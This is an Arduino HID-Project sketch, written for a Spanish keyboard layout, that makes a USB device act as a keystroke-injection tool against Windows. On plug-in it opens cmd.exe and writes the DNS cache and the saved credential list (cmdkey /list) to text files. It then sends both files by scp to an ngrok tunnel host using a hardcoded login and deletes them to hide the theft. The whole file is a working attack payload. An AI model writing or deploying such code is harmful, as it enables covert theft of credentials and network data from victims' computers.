#include "HID-Project.h"
#define KEY_ES_AO           KEY_TILDE
#define KEY_ES_QUOTE        KEY_MINUS
#define KEY_ES_INVMARKS     KEY_EQUAL
#define KEY_ES_CIRCUMFLEX   KEY_LEFT_BRACE
#define KEY_ES_PLUS         KEY_RIGHT_BRACE
#define KEY_ES_NTILDE       KEY_SEMICOLON
#define KEY_ES_UMLAUT       KEY_QUOTE
#define KEY_ES_CEDILLA      KEY_BACKSLASH
#define KEY_ES_MINUS        KEY_SLASH
#define KEY_ES_LT_GT        KEY_NON_US


void setup() {
    Keyboard.begin();
    delay(1000);
    
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_R);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.println("cmd.exe");
    delay(200);
    Keyboard.println("cd Downloads");
    Keyboard.print("ipconfig /displaydns ");
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_ES_LT_GT);
    Keyboard.releaseAll();
    Keyboard.println("dns.txt");
    Keyboard.print("cmdkey /list ");
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_ES_LT_GT);
    Keyboard.releaseAll();
    Keyboard.println("credenciales.txt");
    Keyboard.print("scp ");
    Keyboard.press(KEY_ES_MINUS);
    Keyboard.releaseAll();
    Keyboard.print("P 15528 dns.txt jhon");
    Keyboard.press(KEY_RIGHT_ALT);
    Keyboard.press(KEY_Q);
    Keyboard.releaseAll();
    Keyboard.print("0.tcp.sa.ngrok.io>"); 
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_7);
    Keyboard.releaseAll();
    Keyboard.println("tmp");
    delay(1000);
    Keyboard.println("yes");
    delay(1000);
    Keyboard.println("jhon456");
    delay(4000);
    Keyboard.print("scp ");
    Keyboard.press(KEY_ES_MINUS);
    Keyboard.releaseAll();
    Keyboard.print("P 15528 credenciales.txt jhon");
    Keyboard.press(KEY_RIGHT_ALT);
    Keyboard.press(KEY_Q);
    Keyboard.releaseAll();
    Keyboard.print("0.tcp.sa.ngrok.io>"); 
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_7);
    Keyboard.releaseAll();
    Keyboard.println("tmp");
    delay(3000);
    Keyboard.println("jhon456");
    delay(5000);
    Keyboard.println("del /s /q dns.txt");
    delay(200);
    Keyboard.println("del /s /q credenciales.txt");
    delay(200);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll(); 
    
}
void loop() {}
